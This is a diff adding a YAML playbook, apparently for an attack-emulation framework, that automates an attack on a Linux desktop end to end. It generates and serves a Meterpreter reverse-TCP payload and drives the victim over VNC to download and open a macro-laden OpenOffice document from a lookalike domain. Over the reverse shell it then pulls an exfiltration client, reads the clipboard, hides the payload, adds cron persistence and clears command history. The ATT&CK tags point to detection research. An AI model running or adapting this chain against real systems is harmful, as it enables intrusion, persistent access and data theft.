@@ -1,0 +1,351 @@
+# Client opens an Open Office Document with a macro that download and executes payload
+# persistence via cron job
+
+vars:
+  PAYLOAD: cmd/unix/python/meterpreter/reverse_tcp
+  LPORT: 4443
+  ATTACKMATE_IP: 192.42.1.174
+  CLIENT_IP: 192.168.50.100
+  MGMT_IP: 192.42.0.201
+  MGMT_USERNAME: aecid
+  CLIENT_VNC_PORT: 5900
+  ATTACKER_VNC_PORT: 5901
+  RUSTDESK_PACKAGE: https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb
+
+
+commands:
+  # establish ssh tunneling via mgmt host, everything sent to attacker port 5902 will be forwarded to client port 5901 (vnc), i.e. 
+  # ssh -i /home/aecid/.ssh/attacker -o StrictHostKeyChecking=no -L 5902:192.168.50.100:5901 aecid@192.42.0.201
+
+
+##################### SSH TUNNEL VIA MGMT HOST ############################
+
+  - type: shell
+    interactive: true
+    creates_session: tunnel
+    cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
+
+################### SERVE THE OPEN OFFICE DOCUMENT ############################
+
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/Nutzungshinweise.odt
+    port: 8086
+    background: True
+
+################### SERVE VEILTRANSFER CLIENT ############################
+
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/VeilTransfer/veiltransfer_client_linux
+    port: 8082
+    background: True
+
+################### SERVE THE METERPRETER PAYLOAD ############################
+
+  # tempfile for reverse shell payload
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+  
+  # generate reverse shell
+  - type: msf-payload
+    cmd: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKMATE_IP
+      LPORT: $LPORT
+    local_path: $RSHELL
+  
+  # serve payload via http
+  - type: webserv
+    local_path: $RSHELL
+    port: 8080
+    background: True
+
+  # prepare reverse-shell-listener
+  - type: msf-module
+    creates_session: revshell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKMATE_IP
+      LPORT: $LPORT
+    background: true
+    kill_on_exit: true
+
+################### CLIENT OPENS DOCUMENT ############################
+
+  - type: vnc
+    cmd: capture
+    filename: initial_screenshot.png
+    hostname: localhost
+    port: 5902
+    creates_session: client
+
+  # Opening a terminal from the menu
+
+  - type: vnc
+    cmd: move
+    x: 5
+    y: 5
+    session: client
+
+  - type: vnc
+    cmd: click
+    session: client
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: type
+    input: "terminal"
+    session: client
+    
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: client
+
+  - type: sleep
+    seconds: 3
+
+  # copy something to the clipboard
+  - type: vnc 
+    cmd: type 
+    input: echo 'Dummy Text' | xclip -selection clipboard
+    session: client
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: client
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc 
+    cmd: type 
+    input: "curl -o /home/judy/Nutzungshinweise.odt dailynews-wire.com:8086/index"
+    session: client
+    metadata:
+      techniques: "T1105,T1204.002"
+      tactics: "Command and Control, Execution"
+      technique_name: "Ingress Tool Transfer,User Execution: Malicious File"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: client
+
+  - type: sleep
+    seconds: 5
+
+  # Open the Document with the malicious macro
+  - type: vnc 
+    cmd: type 
+    input: "soffice /home/judy/Nutzungshinweise.odt"
+    session: client
+    metadata:
+      techniques: "T1204.002"
+      tactics: "Execution"
+      technique_name: "User Execution: Malicious File"
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: client
+    metadata:
+      techniques: "T1204.002"
+      tactics: "Execution"
+      technique_name: "User Execution: Malicious File"
+
+  - type: sleep
+    seconds: 3
+
+################### ATTACKER INTERACTS WITH METERPRETER ############################
+  # run commands via reverse shell
+  - type: msf-session
+    stdapi: true
+    session: revshell
+    cmd: sysinfo
+    metadata:
+      techniques: "T1082"
+      tactics: "Discovery"
+      technique_name: "System Information Discovery"
+
+################### PERSISTENCE OPTION B, CRON JOB ############################
+
+  # upload cronjob that extracts data
+  - type: msf-session
+    session: revshell
+    cmd: upload downloader.sh
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
+
+################### ATTACKER GATHERS INFORMATION ############################
+
+  # Prepare for upgradeshell
+  - type: setvar
+    cmd: revshell
+    variable: $UPGRADESESSION
+
+  - type: include
+    local_path: upgrade.yml
+
+  # download the veiltransfer_client_linux executable
+  - type: msf-session
+    cmd: curl -o /home/judy/.local/bin/task_runner dailynews-wire.com:8082/index
+    session: revshell
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
+
+  # get the last clipboard entry
+  - type: msf-session
+    session: revshell
+    cmd: xclip -selection clipboard -o
+    metadata:
+      techniques: "T1115"
+      tactics: "Collection"
+      technique_name: "Clipboard Data"
+
+  # save the meterpreter payload in /home
+  - type: msf-session
+    session: revshell
+    cmd: cp /tmp/index /home/judy/.index
+    metadata:
+      techniques: "T1564.001"
+      tactics: "Defense Evasion"
+      technique_name: "Hide Artifacts: Hidden Files and Directories"
+
+  # make the veiltransfer client binary executable
+  - type: msf-session
+    session: revshell
+    cmd: chmod +x /home/judy/.local/bin/task_runner 
+    metadata:
+      techniques: "T1222.002"
+      tactics: "Defense Evasion" 
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
+
+  # make the downloader script executable
+  - type: msf-session
+    session: revshell
+    cmd: chmod +x /home/judy/downloader.sh
+    metadata:
+      techniques: "T1222.002"
+      tactics: "Defense Evasion" 
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
+
+  # add the cronjob 
+  - type: msf-session
+    session: revshell
+    cmd: crontab -e
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: ":inoremap jj <ESC>"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "o"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "*/10 * * * * /home/judy/download.sh"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "jj"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "o"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "*/5 * * * * /bin/bash -c /home/judy/.index"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "jj"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: ":wq!\n"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  # find out which windown are open
+  - type: msf-session
+    session: revshell
+    cmd:  wmctrl -l
+    metadata:
+      techniques: "T1010"
+      tactics: "Discovery"
+      technique_name: "Application Window Discovery"
+
+  # clear history
+  - type: msf-session
+    session: revshell
+    cmd: history -c
+    metadata:
+      techniques: "T1070.003"
+      tactics: "Defense Evasion"
+      technique_name: "Indicator Removal: Clear Command History"
+
+  # exit the interactive shell
+  - type: msf-session
+    session: revshell
+    cmd: exit
+
+
